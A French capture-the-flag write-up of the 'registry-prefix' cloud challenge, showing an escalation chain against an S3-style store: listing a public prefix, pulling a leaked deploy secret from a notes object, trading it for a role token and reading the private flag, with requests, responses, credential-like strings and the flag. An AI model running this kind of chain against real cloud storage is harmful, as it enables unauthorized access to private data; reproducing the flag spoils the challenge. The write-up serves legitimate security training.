# registry-prefix

## Challenge
**Catégorie :** cloud  **Auteur :** hibris / Clawd  **Points :** 50 (dynamique)
**Instance :** par équipe (bouton Démarrer), HTTP, flag sur le filesystem « served by no route »
**Format :** `NCTF{...}`

> Cible : `registry-prefix` — le registre d'artefacts de la plateforme cloud, qui stocke
> les images et les paquets déployés. Piste : *Préfixe public → credential fuité → escalade de rôle*.
> This instance's flag is on the service's filesystem, served by no route. Exploit the service to read it.

## Résolution<>
Object-store façon S3 avec ACL par préfixe. Trois routes :
`/list?prefix=` (seul `public/` est listable), `/get?key=` (les clés `private/*` exigent un
header `X-Role-Token`), `/assume?secret=` (échange un secret contre un token de rôle).

Chaîne d'escalade :

1. **Lister le préfixe public**
   ```
   GET /list?prefix=public/
   → {"keys":["public/readme.txt","public/backup-notes.txt"]}
   ```
2. **Credential fuité** dans l'objet de notes :
   ```
   GET /get?key=public/backup-notes.txt
   → deploy_secret=AKIA82c8ffe7a63c4ab0c1bd
     # secret unlocks the backup-restore role (reads private/*)
   ```
3. **Assumer le rôle** avec le secret :
   ```
   GET /assume?secret=AKIA82c8ffe7a63c4ab0c1bd
   → {"role":"backup-restore","token":"role-mOaS0Gq9cjRaMjvO4mjTyCu-xhaDMxRc"}
   ```
4. **Lire le flag** (clé privée + token) :
   ```
   GET /get?key=private/flag   (header: X-Role-Token: role-mOaS0Gq9cjRaMjvO4mjTyCu-xhaDMxRc)
   → {"body":"NCTF{b0122351c3b584bb44aed38d}","key":"private/flag"}
   ```

Automatisé par `solve_prefix.py <url_instance>` (découvre l'objet public, extrait le secret
`AKIA…`/`deploy_secret=`, assume le rôle, teste les clés `private/flag[.txt|.json]`).

## Leurres / notes
- `/list` ne liste que `public/` (403 sinon) ; la clé `private/flag` n'est pas listable,
  il faut la deviner (nom logique) — c'est le sens de « served by no route ».
- Path traversal `/get?key=../…` → 404, inutile.
- **Flag rotaté en finale** : la méthode est identique aux quals mais le flag diffère,
  il faut rejouer sur l'instance live (ne pas recoller l'ancien).
- La série `*-prefix` (artifacts/backup/billing/cdn/gateway/identity/metrics/queue/registry)
  est la **même chaîne** → `solve_prefix.py` les résout toutes.

## Flag
`NCTF{b0122351c3b584bb44aed38d}`  ✅ (first blood Hawk Eye)
